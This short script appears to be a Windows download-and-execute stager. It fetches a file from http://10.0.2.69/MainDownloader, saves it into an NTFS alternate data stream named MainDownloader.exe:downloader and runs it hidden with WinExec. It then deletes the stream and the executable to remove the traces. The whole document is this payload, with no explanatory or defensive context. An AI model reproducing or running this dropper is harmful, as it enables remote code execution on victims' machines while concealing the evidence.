function URLDownloadToFileA("urlmon.dll");
function WinExec("kernel32.dll");
function DeleteFileA("kernel32.dll");

URLDownloadToFileA(0,"http://10.0.2.69/MainDownloader","MainDownloader.exe:downloader",0,0);
WinExec("MainDownloader.exe:downloader",0);
DeleteFileA("MainDownloader.exe:downloader");
DeleteFileA("MainDownloader.exe");